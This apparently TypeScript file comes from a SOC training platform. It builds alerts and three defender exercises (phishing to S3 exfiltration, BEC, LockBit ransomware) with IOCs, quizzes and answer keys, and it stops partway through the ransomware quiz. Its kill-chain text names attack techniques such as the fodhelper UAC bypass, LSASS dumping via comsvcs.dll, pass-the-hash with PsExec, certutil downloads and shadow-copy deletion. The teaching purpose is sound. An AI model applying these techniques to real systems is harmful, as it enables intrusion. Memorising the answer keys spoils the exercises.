/**
 * SOC Training Platform — Scenario Builders
 * Each scenario produces 10-12 curated, story-driven telemetry events that
 * give a student exactly the clues needed to investigate the attack chain.
 * Events have rich human-readable `description` fields shown in the log viewer.
 */
import type { Alert, IOC, ScenarioBundle, ScenarioQuestion, Severity, TelemetryEvent } from "./types";
import { makeSha256 } from "./iocs";
import { buildBackupFalsePositiveScenario } from "./scenario-packs/backupFalsePositive";
import { buildWebShellRceScenario }         from "./scenario-packs/webShellRce";
import { buildLinuxSshPersistenceScenario } from "./scenario-packs/linuxSshPersistence";
import { buildAitmTokenTheftScenario }      from "./scenario-packs/aitmTokenTheft";
import { buildEsxiRansomwareScenario }      from "./scenario-packs/esxiRansomware";
import { buildBruteForceSingleAccountScenario } from "./scenario-packs/bruteForceSingleAccount";
import { buildOktaPasswordBurstScenario }    from "./scenario-packs/oktaPasswordBurst";
import { buildFakeBrowserUpdateScenario }    from "./scenario-packs/fakeBrowserUpdate";
import { buildTrojanizedInstallerKeyloggerScenario } from "./scenario-packs/trojanizedInstallerKeylogger";
import { buildMultiHostIntrusionScenario } from "./scenario-packs/multiHostIntrusion";
import { buildAiLlmJackingScenario } from "./scenario-packs/aiLlmJacking";
import { buildGwsPhishingAttachmentScenario } from "./scenario-packs/gwsPhishingAttachment";
import { buildSeoPoisonedInstallerScenario }     from "./scenario-packs/seoPoisonedInstaller";
import { buildIsoContainerSmugglingScenario }    from "./scenario-packs/isoContainerSmuggling";
import { buildClickFixFakeCaptchaScenario }      from "./scenario-packs/clickFixFakeCaptcha";
import { buildScheduledTaskPersistenceScenario } from "./scenario-packs/scheduledTaskPersistence";
import { buildRogueAdminAccountScenario }   from "./scenario-packs/rogueAdminAccount";
import { buildImpossibleTravelBasicScenario } from "./scenario-packs/impossibleTravelBasic";
import { buildSoftwareInstallFalsePositiveScenario } from "./scenario-packs/softwareInstallFalsePositive";
// P0 attack-coverage additions (docs/live-feed-attack-coverage-review.md)
import { buildInfostealerSessionTheftScenario } from "./scenario-packs/infostealerSessionTheft";
import { buildEdgeVpnCveExploitScenario }        from "./scenario-packs/edgeVpnCveExploit";
import { buildExfilFirstExtortionScenario }      from "./scenario-packs/exfilFirstExtortion";
import { buildHelpdeskMfaResetScenario }         from "./scenario-packs/helpdeskMfaReset";
import { buildWindowsPrivescTokenScenario }      from "./scenario-packs/windowsPrivescToken";
import { buildLinuxPrivescSuidScenario }         from "./scenario-packs/linuxPrivescSuid";
import { buildLateralMovementPthScenario }       from "./scenario-packs/lateralMovementPth";
import { buildInsiderDlpUsbCloudScenario }       from "./scenario-packs/insiderDlpUsbCloud";
import { buildNacRogueDeviceScenario }           from "./scenario-packs/nacRogueDevice";
import { buildMacosStealerDmgScenario }          from "./scenario-packs/macosStealerDmg";
import { buildSqliDbExfilScenario }              from "./scenario-packs/sqliDbExfil";
import { buildAzureManagedIdentityAbuseScenario } from "./scenario-packs/azureManagedIdentityAbuse";
import { buildCicdSupplyChainScenario }          from "./scenario-packs/cicdSupplyChain";
import { buildUebaCompromisedAccountScenario }   from "./scenario-packs/uebaCompromisedAccount";
import { buildVishingRmmScenario }               from "./scenario-packs/vishingRmm";
import { buildPamVaultAbuseScenario }            from "./scenario-packs/pamVaultAbuse";
import { buildDestructiveWiperScenario }         from "./scenario-packs/destructiveWiper";
import { buildS3ExfilExposureScenario }          from "./scenario-packs/s3ExfilExposure";
import { buildGoldenSamlScenario }               from "./scenario-packs/goldenSaml";
import { buildGwsOauthMarketplaceScenario }      from "./scenario-packs/gwsOauthMarketplace";
import { buildThreatIntelHuntScenario }          from "./scenario-packs/threatIntelHunt";
import { buildMobileMdmCompromiseScenario }      from "./scenario-packs/mobileMdmCompromise";
import { buildGcpSaKeyTheftScenario }            from "./scenario-packs/gcpSaKeyTheft";
import { buildMacosTccPkgScenario }              from "./scenario-packs/macosTccPkg";
import { buildEmailBombHelpdeskScenario }        from "./scenario-packs/emailBombHelpdesk";
import { buildOtNetworkAnomalyScenario }         from "./scenario-packs/otNetworkAnomaly";
import { buildBecWireFraudScenario }             from "./scenario-packs/becWireFraud";
import {
  phishingToExfilEvents,
  becScenarioEvents,
  ransomwareScenarioEvents,
  oauthScenarioEvents,
  insiderThreatScenarioEvents,
  impossibleTravelScenarioEvents,
  cloudKeyLeakS3ExfilScenarioEvents,
  dcSyncScenarioEvents,
  supplyChainScenarioEvents,
  mfaFatigueScenarioEvents,
  asRepRoastingScenarioEvents,
  ntlmRelayScenarioEvents,
  k8sPodEscapeScenarioEvents,
  oauthConsentPhishingScenarioEvents,
  kerberoastingScenarioEvents,
  dnsTunnelingScenarioEvents,
  lolBinsScenarioEvents,
  phishingMalwareScenarioEvents,
  usbMalwareScenarioEvents,
  browserExtensionMalwareScenarioEvents,
  techSupportScamScenarioEvents,
  crackedSoftwareScenarioEvents,
  maliciousMacroScenarioEvents,
} from "./scenarioEvents";

// ─── Alert auto-generator ────────────────────────────────────────────────────

// Build the alert's title + description from the EVENT'S OWN OBSERVABLES — never a
// per-technique template (which could contradict the event it points at: the old
// generator stamped "macro Office document" on a .pdf.exe ZIP, and "PowerShell
// beacon" where no PowerShell existed) and never the analyst's prose conclusion
// (that is the exercise — see F-02). An alert states what the tool SAW, grounded
// in the same structured observables the analyst reads on the event row, so it can
// never disagree with its own event.
function alertTextFromEvent(e: TelemetryEvent): { title: string; description: string } {
  const vendor = e.vendor ?? e.source.toUpperCase();
  const host = e.hostname ? ` on ${e.hostname}` : "";
  const p = e.process;
  const n = e.network;
  if (p?.name) {
    const parent = p.parent_name ? ` (child of ${p.parent_name})` : "";
    return {
      title: `${vendor} flagged process ${p.name}${host}`,
      description: `${vendor} raised a detection on ${p.name}${parent}${host}${p.cmdline ? ` — command line: ${p.cmdline}` : ""}.`,
    };
  }
  if (n?.domain) {
    return {
      title: `${vendor}: outbound connection to ${n.domain}${host}`,
      description: `${vendor} flagged a connection to ${n.domain}${e.dst_ip ? ` (${e.dst_ip})` : ""}${host}.`,
    };
  }
  if (n?.url) {
    let hostPart = n.url;
    try { hostPart = new URL(n.url).host; } catch { /* keep the raw url */ }
    return {
      title: `${vendor}: web request to ${hostPart}${host}`,
      description: `${vendor} flagged a web request to ${n.url}${host}.`,
    };
  }
  if (e.file?.path) {
    return {
      title: `${vendor}: file activity — ${e.file.path}${host}`,
      description: `${vendor} flagged file activity on ${e.file.path}${host}${e.file.sha256 ? ` (sha256 ${e.file.sha256})` : ""}.`,
    };
  }
  const et = e.event_type.replace(/_/g, " ");
  if (e.user_email && /auth|login|logon|sign|account|mfa|token/i.test(e.event_type)) {
    return {
      title: `${vendor}: ${et} — ${e.user_email}${e.src_ip ? ` from ${e.src_ip}` : ""}`,
      description: `${vendor} recorded ${et} for ${e.user_email}${e.src_ip ? ` from ${e.src_ip}` : ""}${host}.`,
    };
  }
  return {
    title: `${vendor} detection: ${et}${host}`,
    description: `${vendor} raised a ${e.severity ?? "medium"} detection (${et})${host}.`,
  };
}

export function eventsToAlerts(events: TelemetryEvent[], scenario_id: string): Alert[] {
  const alerts: Alert[] = [];
  let aid = 0;
  // Builders declare events in narrative order, which is not always
  // chronological — several scenarios listed a tool launch after the traffic it
  // produced. Alerts must run on the clock, so sort a copy here rather than
  // relying on every builder to keep its array ordered.
  const ordered = [...events].sort((a, b) => new Date(a.ts).getTime() - new Date(b.ts).getTime());
  for (const e of ordered) {
    if (!e.mitre_technique) continue;
    if (!e.severity || e.severity === "informational" || e.severity === "low") continue;
    aid += 1;
    const sevToConf: Record<Severity, number> = { critical: 95, high: 86, medium: 72, low: 55, informational: 30 };
    const sevToRisk: Record<Severity, number> = { critical: 92, high: 78, medium: 60, low: 40, informational: 15 };
    const tactic = tacticForTechnique(e.mitre_technique);
    alerts.push({
      id: `alt_${scenario_id.slice(0, 6)}_${aid}`,
      alert_uid: vendorAlertId(e.vendor ?? e.source, scenario_id, aid),
      ...alertTextFromEvent(e),
      source: e.source, vendor: e.vendor ?? e.source.toUpperCase(),
      severity: e.severity,
      status: "new",
      confidence: sevToConf[e.severity],
      risk_score: sevToRisk[e.severity],
      mitre_tactic: tactic, mitre_technique: e.mitre_technique,
      hostname: e.hostname, user_email: e.user_email,
      src_ip: e.src_ip, dst_ip: e.dst_ip,
      process: e.process ? { name: e.process.name, cmdline: e.process.cmdline, parent: e.process.parent_name, sha256: e.file?.sha256 } : undefined,
      url: e.network?.url, domain: e.network?.domain,
      detected_at: e.ts,
      related_events: [e.id],
    });
  }
  return alerts;
}

function vendorAlertId(vendor: string, scenarioId: string, n: number): string {
  const v = vendor.toLowerCase();
  const tag = v.includes("crowd") ? "CRWD" : v.includes("sentinel") || v.includes("microsoft") ? "MDE" :
    v.includes("splunk") ? "SPL" : v.includes("palo") ? "PAN" : v.includes("okta") ? "OKTA" :
    v.includes("aws") || v.includes("cloudtrail") ? "AWS" : v.includes("sysmon") ? "SYSMON" : "SIEM";
  const h = n.toString(16).toUpperCase().padStart(8, "0");
  return `${tag}-${h}`;
}


function tacticForTechnique(t: string): string | undefined {
  if (t.startsWith("T1566")) return "TA0001";
  if (t.startsWith("T1091")) return "TA0001";   // Initial Access (replication through removable media)
  if (t === "T1200")        return "TA0001";   // Initial Access (hardware additions: a USB drive plugged in)
  if (t.startsWith("T1176")) return "TA0003";   // Persistence (browser extensions, incl. T1176.001)
  if (t.startsWith("T1219")) return "TA0011";   // Command and Control (remote access software, incl. T1219.002)
  if (t.startsWith("T1059")) return "TA0002";
  if (t.startsWith("T1547") || t.startsWith("T1543")) return "TA0003";
  if (t.startsWith("T1218") || t.startsWith("T1027")) return "TA0005";   // Stealth (ATT&CK v19)
  if (t.startsWith("T1685") || t.startsWith("T1686")) return "TA0112";   // Defense Impairment (ATT&CK v19)
  if (t.startsWith("T1003") || t.startsWith("T1110") || t.startsWith("T1555")) return "TA0006";
  if (t.startsWith("T1021")) return "TA0008";
  if (t.startsWith("T1569")) return "TA0002";
  if (t.startsWith("T1071")) return "TA0011";
  if (t.startsWith("T1567") || t.startsWith("T1041") || t.startsWith("T1052")) return "TA0010";
  if (t.startsWith("T1486") || t.startsWith("T1490")) return "TA0040";
  if (t.startsWith("T1098")) return "TA0003";
  if (t.startsWith("T1114") || t.startsWith("T1530")) return "TA0009";
  if (t === "T1078") return "TA0001";
  if (t.startsWith("T1087") || t.startsWith("T1046") || t.startsWith("T1057") || t === "T1018" || t === "T1135" || t === "T1482") return "TA0007";
  if (t.startsWith("T1558")) return "TA0006";
  if (t.startsWith("T1105")) return "TA0011";
  if (t.startsWith("T1218") || t.startsWith("T1197")) return "TA0005";
  if (t.startsWith("T1053")) return "TA0003";
  if (t.startsWith("T1552")) return "TA0006";   // Credential Access
  if (t === "T1078.004") return "TA0001";        // Initial Access (valid cloud accounts)
  if (t.startsWith("T1580")) return "TA0007";   // Discovery
  if (t.startsWith("T1578")) return "TA0112";   // Defense Impairment (ATT&CK v19)
  if (t === "T1136.003") return "TA0003";        // Persistence (cloud account created)
  if (t === "T1098.001") return "TA0003";        // Persistence (account manipulation)
  if (t.startsWith("T1496")) return "TA0040";   // Impact (resource hijacking)
  if (t.startsWith("T1136")) return "TA0003";   // Persistence (account creation)
  if (t.startsWith("T1070")) return "TA0005";   // Stealth (indicator removal; log clearing is T1685.005)
  if (t.startsWith("T1195")) return "TA0001";   // Initial Access (supply chain)
  if (t === "T1083") return "TA0007";           // Discovery (file search)
  if (t.startsWith("T1036")) return "TA0005";   // Stealth (masquerading)
  if (t === "T1621")        return "TA0006";   // Credential Access (MFA fatigue)
  if (t === "T1558.004")    return "TA0006";   // Credential Access (AS-REP Roasting)
  if (t === "T1557.001")    return "TA0009";   // Collection (LLMNR/NTLM relay)
  if (t === "T1610")        return "TA0002";   // Execution (deploy container)
  if (t === "T1611")        return "TA0004";   // Privilege Escalation (escape to host)
  if (t === "T1552.005")    return "TA0006";   // Credential Access (IMDS)
  if (t === "T1528")        return "TA0006";   // Credential Access (steal app token)
  if (t === "T1137.005")    return "TA0003";   // Persistence (Outlook rules)
  if (t === "T1114.003")    return "TA0009";   // Collection (email forwarding rule)
  if (t === "T1078.002")    return "TA0001";   // Initial Access (domain accounts) — matches T1078/.004 above; ATT&CK does not list Lateral Movement for T1078
  if (t === "T1550.003")    return "TA0008";   // Lateral Movement (pass the ticket)
  if (t === "T1204.002")    return "TA0002";   // Execution (user opens malicious file)
  if (t === "T1219")        return "TA0011";   // Command and Control (remote access software)
  if (t === "T1176")        return "TA0003";   // Persistence (browser extensions)
  if (t === "T1566.002")    return "TA0001";   // Initial Access (spearphishing link)
  if (t === "T1556.009")    return "TA0006";   // Credential Access (modify conditional access policies)
  return undefined;
}

// =========================================================================
// Scenario 1: Phishing macro → AWS key theft → S3 download
// =========================================================================

export function buildPhishingToExfil(scenarioId = "phish-exfil-2026"): ScenarioBundle {
  const { title, events, T, MIN, victim, c2Domain, c2Ip, attackerIp, senderIp, dllHash, docmHash } = phishingToExfilEvents();

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "domain",  value: c2Domain,                        reputation: "malicious",  tags: ["c2", "newly-registered"] },
    { type: "ip",      value: c2Ip,                            reputation: "malicious",  tags: ["c2"] },
    { type: "ip",      value: attackerIp,                      reputation: "malicious",  tags: ["aws-key-use", "s3-download"] },
    { type: "ip",      value: senderIp,                        reputation: "malicious",  tags: ["phishing-sender"] },
    { type: "sha256",  value: dllHash,                         reputation: "malicious",  tags: ["dropper", "dll", "stage1"] },
    { type: "sha256",  value: docmHash,                        reputation: "malicious",  tags: ["macro-document", "email-attachment"] },
    { type: "email",   value: "support@nexacorp-vendor.xyz",   reputation: "malicious",  tags: ["phishing", "sender"] },
    { type: "user",    value: victim.email,                    reputation: "suspicious", tags: ["victim", "compromised"] },
    { type: "host",    value: victim.hostname,                 reputation: "unknown", tags: ["patient-zero"] },
  ];

  const killchain = [
    { ts: T(5 * MIN),          phase: "Initial Access",          action: "Phishing email 'Invoice_Q3_Final.docm' delivered - SPF/DKIM/DMARC failed, a keyword transport rule allowed it" },
    { ts: T(5 * MIN + 31_000), phase: "Execution",               action: "WINWORD.EXE spawns hidden PowerShell (execution policy bypass); Falcon raises a detection, no action" },
    { ts: T(5 * MIN + 42_000), phase: "Command & Control",       action: "The same PowerShell process resolves 3-day-old cdn-update-fb76.xyz and connects to it over HTTPS" },
    { ts: T(8 * MIN),          phase: "Persistence",             action: "svchost32.dll dropped to %TEMP%; HKCU Run key 'WindowsUpdater' created" },
    { ts: T(38 * MIN),         phase: "Credential Access",       action: "The same PowerShell process opens C:\\Users\\jsmith\\.aws\\credentials; the next check-in to the C2 server is slightly larger than the earlier ones" },
    { ts: T(40 * MIN),         phase: "Discovery",               action: "Access key AKIA4XJ9PQ2M7EXAMPLE calls GetCallerIdentity, then ListBuckets and ListObjectsV2 on nexacorp-crm-exports, from an external IP" },
    { ts: T(43 * MIN),         phase: "Collection",              action: "Same key reads exports/customer-financial-data-2026.zip (184 MB) from nexacorp-crm-exports" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "Which MITRE technique best describes the initial access vector used in this attack?", kind: "single",
      options: [
        { value: "T1566.001", label: "T1566.001 - Spearphishing Attachment (.docm macro)" },
        { value: "T1190",     label: "T1190 - Exploit Public-Facing Application (web/VPN flaw)" },
        { value: "T1078",     label: "T1078 - Valid Accounts (reused finance credentials)" },
        { value: "T1133",     label: "T1133 - External Remote Services (VPN/Citrix gateway)" },
      ],
      answer: "T1566.001", xp: 50,
      explanation: "A macro-enabled Word document (.docm) was delivered via phishing email. When the user enabled macros, Office spawned PowerShell - this is T1566.001 Spearphishing Attachment. The SPF/DKIM/DMARC bypass via transport rule is a delivery bypass, not the technique itself." },
    { id: "q2", prompt: "Which process is the parent of the hidden powershell.exe that Falcon recorded at 09:47:31 running inv_q3.ps1?", kind: "single",
      options: [
        { value: "OUTLOOK.EXE", label: "OUTLOOK.EXE - Outlook email client" },
        { value: "WINWORD.EXE", label: "WINWORD.EXE - Microsoft Word client" },
        { value: "explorer.exe", label: "explorer.exe - Windows desktop shell" },
        { value: "svchost.exe",  label: "svchost.exe - Windows service host" },
      ],
      answer: "WINWORD.EXE", xp: 50,
      explanation: "WINWORD.EXE spawning powershell.exe is the canonical Office macro execution pattern. A Word process should never legitimately spawn PowerShell - this parent-child relationship alone should trigger an immediate alert." },
    { id: "q3", prompt: "Which TWO artifacts together form the persistence mechanism on WS-FIN-2847?", kind: "multi",
      options: [
        { value: "run_key", label: "HKCU Run key 'WindowsUpdater' → rundll32 + svchost32.dll" },
        { value: "aws",     label: "The AWS CLI profile C:\\Users\\jsmith\\.aws\\credentials" },
        { value: "dll",     label: "svchost32.dll dropped to C:\\Users\\jsmith\\AppData\\Local\\Temp\\" },
        { value: "docm",    label: "Invoice_Q3_Final.docm in the Downloads folder" },
      ],
      answer: ["run_key", "dll"], xp: 75,
      explanation: "The DLL is the payload; the Run key is the autorun trigger. Together they ensure the implant survives reboots. The AWS profile is the credential that was read (credential access), not persistence. The .docm is the delivery vehicle - it only runs when a user opens it again." },
    { id: "q4", prompt: "What single containment action best stops the active threat on WS-FIN-2847 immediately?", kind: "single",
      options: [
        { value: "isolate",  label: "Network-isolate the endpoint via EDR console" },
        { value: "reboot",   label: "Reboot the endpoint to kill the beacon process" },
        { value: "block_ip", label: "Block the C2 IP at the perimeter firewall only" },
        { value: "warn",     label: "Send j.smith a security awareness reminder email" },
      ],
      answer: "isolate", xp: 50,
      explanation: "EDR network isolation severs all connections (C2, lateral) while preserving memory and disk for forensics. Rebooting kills the process but the Run key re-executes it on next logon. Blocking a single IP fails because the attacker can rotate IPs. Email warning doesn't address an active compromise." },
    { id: "q5", prompt: "Isolating WS-FIN-2847 does not stop the S3 access. Which action closes it?", kind: "single",
      options: [
        { value: "deactivate_key", label: "Deactivate access key AKIA4XJ9PQ2M7EXAMPLE (jsmith-analytics) and review its CloudTrail activity" },
        { value: "reset_ad",       label: "Reset j.smith's Active Directory password and require a new sign-in on every device" },
        { value: "block_domain",   label: "Sinkhole cdn-update-fb76.xyz at the DNS resolver and block 185.134.140.139 at the firewall" },
        { value: "delete_bucket",  label: "Delete the nexacorp-crm-exports bucket so nothing more can be read from it" },
      ],
      answer: "deactivate_key", xp: 75,
      explanation: "GetCallerIdentity, ListBuckets, ListObjectsV2 and GetObject were all signed with the long-term IAM access key read from the workstation's AWS profile, from an external IP that never appears in the key's earlier office-network history. That key works from anywhere, independent of the endpoint and of the AD password, so it must be deactivated (then rotated) and its full CloudTrail history reviewed for other reads. Sinkholing the domain stops the beacon, not the key; deleting the bucket destroys evidence and business data." },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "TA-COBALTSPIDER (financially motivated)",
    attack_kind: "phishing_to_exfil",
    briefing: "CrowdStrike raised a high-severity detection on WS-FIN-2847 (j.smith) at 09:47 for a hidden PowerShell process. The detection was 'detect only' and has sat unassigned for an hour.",
    narrative: `At 09:47, a finance analyst at NexaCorp Industries received what appeared to be a routine vendor invoice. The macro-enabled Word attachment failed SPF, DKIM and DMARC but was delivered anyway by a keyword transport rule, and macro blocking for files from the internet had been relaxed for the finance group. Seconds after the document was downloaded and opened, Word wrote a script to %TEMP% and spawned a hidden PowerShell process to run it; Falcon flagged it but took no action. The same process resolved a 3-day-old domain, connected to it, dropped a DLL into %TEMP% and wrote a Run key for persistence. Half an hour later it opened the user's AWS CLI profile - and two minutes after that, the long-term access key stored there was used from an external IP to check its identity and download a 184 MB customer financial export from S3. Your job: trace the chain from the email to the bucket, identify the persistence mechanism, and decide which containment actions stop both the endpoint and the cloud access.`,
    learning_objectives: [
      "Identify spearphishing delivery and recognize SPF/DKIM/DMARC bypass techniques",
      "Trace the Office macro → PowerShell → C2 execution chain using process trees",
      "Distinguish endpoint persistence mechanisms (Registry Run keys + DLL drops)",
      "Link a credential-file read on an endpoint to the cloud API calls signed with that key",
      "Contain both halves of a hybrid incident: isolate the host AND deactivate the cloud key",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario 2: Password Spray → BEC Mailbox Rule
// =========================================================================

export function buildBecScenario(scenarioId = "bec-spray-2026"): ScenarioBundle {
  const { title, events, T, MIN, victim, attackerIp, sprayIp } = becScenarioEvents();

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "ip",    value: sprayIp,                       reputation: "malicious",  tags: ["spray", "netherlands"] },
    { type: "ip",    value: attackerIp,                    reputation: "malicious",  tags: ["attacker", "bec"] },
    { type: "email", value: "l.harris.backup@gmail.com",   reputation: "suspicious", tags: ["forwarding-target", "external"] },
    { type: "user",  value: victim.email,                  reputation: "suspicious", tags: ["victim", "compromised"] },
  ];

  const killchain = [
    { ts: T(0),        phase: "Credential Access",        action: "Password spray - 17 failed AD FS logons across 10 accounts from 158.131.159.30 (two accounts locked out, two passwords guessed)" },
    { ts: T(12 * MIN), phase: "Initial Access",           action: "l.harris approved an MFA prompt from Amsterdam on an unmanaged device, 32 minutes after her office logon and after two unanswered prompts - account compromised" },
    { ts: T(13 * MIN), phase: "Stealth / Concealment", action: "Hidden inbox rule '..' diverts wire/invoice/payment mail to RSS Feeds, marked read" },
    { ts: T(15 * MIN), phase: "Collection",               action: "340 emails scraped in 2 minutes - attacker profiles payment workflows" },
    { ts: T(20 * MIN), phase: "Persistence",              action: "Auto-forward to personal gmail - persistent copy of all inbound mail" },
    { ts: T(25 * MIN), phase: "Impact",                   action: "$247K wire fraud email sent to CFO from compromised account" },
    { ts: T(25 * MIN + 20_000), phase: "Credential Access", action: "Eight MFA prompts for the CFO from the spray address, all denied; she phones the help desk at 08:31" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "What is the PRIMARY intent of the hidden inbox rule named '..'?", kind: "single",
      options: [
        { value: "bec",      label: "Hide wire-fraud replies from the victim to facilitate BEC fraud" },
        { value: "persist",  label: "Maintain persistent mailbox access that survives a password reset" },
        { value: "archival", label: "Personal email archiving that the user set up to tidy their inbox" },
        { value: "spam",     label: "Anti-spam routing that moves the flagged mail out of the inbox" },
      ],
      answer: "bec", xp: 75,
      explanation: "The rule filters wire/invoice/banking/payment emails into a hidden folder. This prevents the real l.harris from seeing that a fraudulent wire transfer was requested and confirmed - the classic BEC playbook. The Unicode dot name (..) makes it invisible in the standard Outlook UI." },
    { id: "q2", prompt: "Which MITRE techniques are present in this incident? (select all that apply)", kind: "multi",
      options: [
        { value: "T1110.003", label: "T1110.003 - Password Spraying" },
        { value: "T1078",     label: "T1078 - Valid Accounts (MFA fatigue bypass)" },
        { value: "T1564.008", label: "T1564.008 - Hide Artifacts: Email Hiding Rules" },
        { value: "T1486",     label: "T1486 - Data Encrypted for Impact (files encrypted on the workstation for ransom)" },
      ],
      answer: ["T1110.003", "T1078", "T1564.008"], xp: 100,
      explanation: "T1110.003 (password spray), T1078 (valid account via MFA fatigue), and T1564.008 (hidden inbox rule) are all present. There is no ransomware - this is purely an identity/BEC attack." },
    { id: "q3", prompt: "p.johnson's Entra sign-in log shows a run of MFA failures in under five minutes. What do the rows show, and which technique is it?", kind: "single",
      options: [
        { value: "fatigue", label: "Eight denied MFA prompts from 158.131.159.30, the address that sprayed AD FS: MFA fatigue (T1621)" },
        { value: "bypass",  label: "Eight denied MFA prompts from 77.83.247.146, the address that signed in as l.harris: MFA fatigue (T1621)" },
        { value: "replay",  label: "Three failed prompts from 158.131.159.30: a user mistyping the code, not an attack" },
        { value: "phish",   label: "Eight SMS code failures from 158.131.159.30: SIM-swap interception of the second factor" },
      ],
      answer: "fatigue", xp: 50,
      explanation: "Count the 500121 rows for p.johnson between 08:25:20 and 08:29:50: eight, all from 158.131.159.30, the same address that sprayed the AD FS endpoint at 08:00 and guessed her password, while the address that signed in as l.harris was 77.83.247.146. Repeated MFA prompts after a valid password, hoping the user approves one, is MFA fatigue or prompt bombing (T1621). The CFO denied every prompt, which is why the second account did not fall, and her call at 08:31 (INC0048217) is how the SOC heard about it." },
    { id: "q4", prompt: "Revoking l.harris's session tokens alone does NOT fully stop the attacker. Why?", kind: "single",
      options: [
        { value: "forward", label: "The email forwarding rule to gmail.com continues delivering mail without an active session" },
        { value: "cache",   label: "Outlook keeps a cached copy of the session token that survives revocation until the client is restarted" },
        { value: "oauth",   label: "A malicious OAuth application was consented to in the tenant and holds its own refresh token" },
        { value: "backup",  label: "The attacker created a second global admin account that keeps working after l.harris is locked out" },
      ],
      answer: "forward", xp: 75,
      explanation: "The forwarding address is a property of the mailbox itself (Set-Mailbox ForwardingSmtpAddress in the audit log) and the inbox rule is a separate mailbox object. Both run server-side in Exchange Online, so they keep working after the session token is revoked: the 08:21 mail-flow row shows a message already copied to the external address. Exchange Online's outbound spam policy normally blocks automatic forwarding to external recipients, so the delivered copy also points to a policy gap worth reporting. Revoke the sessions AND remove the forwarding address and the rule." },
  ];

  return {
    scenario_id: scenarioId,
    title,
    threat_actor: "TA-VOIDPELICAN (Business Email Compromise operator)",
    attack_kind: "identity_bec",
    briefing: "Sentinel flagged 17 failed AD FS logons across 10 accounts from a single external address between 08:00 and 08:04, and a.nelson and r.garcia both locked out. At 08:31 CFO p.johnson called the help desk about unexpected authentication prompts on her phone.",
    narrative: `Over a four-minute window at 08:00, 19 AD FS logon attempts hit ten Finance and Executive accounts from a single Dutch IP in three rounds - staying under the 3-failure lockout threshold on all but two accounts, and guessing two passwords (p.johnson and l.harris). Seven minutes later an attacker on a second Dutch address started signing in as l.harris from an unmanaged Windows device, 32 minutes after her normal office logon: two Authenticator prompts went unanswered and the third was approved at 08:12 (the number-match code was read out to her by a caller posing as IT support). Within a minute the attacker had created a hidden inbox rule intercepting all wire/invoice/payment emails, then scraped 340 emails to profile payment workflows and enabled forwarding to an external Gmail address, which copied its first message at 08:21. At 08:25 a fraudulent $247K wire transfer request landed in the CFO's inbox. From the spray address the attacker also sent the CFO eight MFA prompts in under five minutes - a fatigue attack to compromise the payment approver too; she denied every one and phoned the help desk at 08:31. Your job: reconstruct the attack chain, separate what HIDES the fraud from what OUTLIVES the session, and determine why revoking the session isn't enough.`,
    learning_objectives: [
      "Identify password spraying by recognizing below-threshold multi-account failure patterns",
      "Understand MFA fatigue (prompt bombing) and why push notifications are exploitable",
      "Detect hidden Exchange inbox rules used for Business Email Compromise interception",
      "Understand why session revocation alone is insufficient when forwarding rules exist",
      "Prioritize containment steps for an active BEC incident",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario 3: Ransomware Outbreak - LockBit 3.0
// =========================================================================

export function buildRansomwareScenario(scenarioId = "ransomware-lockbit-2026"): ScenarioBundle {
  const { title, events, T, MIN, zero, server, c2Ip, c2Dom, rswHash, psxHash, docmHash, senderIp } = ransomwareScenarioEvents();

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "domain", value: c2Dom,                           reputation: "malicious",  tags: ["c2", "cobalt-strike"] },
    { type: "ip",     value: c2Ip,                            reputation: "malicious",  tags: ["c2"] },
    { type: "sha256", value: rswHash,                         reputation: "malicious",  tags: ["lockbit3", "ransomware"] },
    { type: "sha256", value: psxHash,                         reputation: "suspicious", tags: ["psexec", "lateral"] },
    { type: "sha256", value: docmHash,                         reputation: "malicious",  tags: ["macro-document", "email-attachment"] },
    { type: "ip",     value: senderIp,                        reputation: "malicious",  tags: ["phishing-sender"] },
    { type: "email",  value: "payroll@nexacorp-updates.net",  reputation: "malicious",  tags: ["phishing"] },
    { type: "host",   value: zero.hostname,                   reputation: "unknown", tags: ["patient-zero"] },
    { type: "host",   value: server.hostname,                 reputation: "unknown", tags: ["encrypted", "lateral-target"] },
    { type: "user",   value: zero.email,                      reputation: "suspicious", tags: ["victim"] },
  ];

  const killchain = [
    { ts: T(0),          phase: "Initial Access",              action: "Phishing 'Salary_Adjustment_Notice.docm' delivered - keyword whitelist bypass" },
    { ts: T(45_000),     phase: "Execution",                   action: "WINWORD macro writes a script and spawns hidden PowerShell (execution policy bypass) → Cobalt Strike stage-1 loader" },
    { ts: T(3 * MIN),    phase: "Command & Control",           action: "Cobalt Strike HTTPS beacon to edge-cdn-updates.xyz: a check-in every minute at first, then every ten minutes" },
    { ts: T(87 * MIN),   phase: "Privilege Escalation",         action: "fodhelper UAC bypass - the ms-settings key launches a second, High-integrity PowerShell" },
    { ts: T(90 * MIN),   phase: "Credential Access",           action: "LSASS dumped via comsvcs.dll - the hash of da-backup, whose disconnected RDP session from the afternoon before was still in memory, is extracted" },
    { ts: T(95 * MIN),   phase: "Discovery",                   action: "nltest, net group and net view enumerate the domain controllers, the Domain Admins and the file server" },
    { ts: T(105 * MIN),  phase: "Lateral Movement",            action: "Pass-the-hash SMB to FS-CORP-01 ADMIN$ - PsExec deployed" },
    { ts: T(109 * MIN + 50_000), phase: "Command & Control",  action: "certutil on FS-CORP-01 downloads wu_update.exe from the raw C2 address" },
    { ts: T(120 * MIN),  phase: "Impact - Recovery Inhibition", action: "vssadmin deletes all 12 shadow copies - recovery prevented" },
    { ts: T(121 * MIN),  phase: "Defense Impairment",           action: "Security, System and Application logs cleared - Event 1102 survives" },
    { ts: T(123 * MIN),  phase: "Impact - Encryption",         action: "LockBit 3.0 encrypts 2,847 files (18GB) across Finance, HR, Contracts shares, adding a random nine-character extension" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "Which host is 'patient zero' - the first infected machine?", kind: "single",
      options: [
        { value: "zero",   label: `${zero.hostname} (${zero.email}) - finance workstation` },
        { value: "server", label: `${server.hostname} - the file server where encryption was first detected` },
        { value: "dc",     label: "DC-CORP-01 - the domain controller that issued the attacker's TGT" },
        { value: "unknown", label: "Cannot be determined - the Security and System logs were cleared" },
      ],
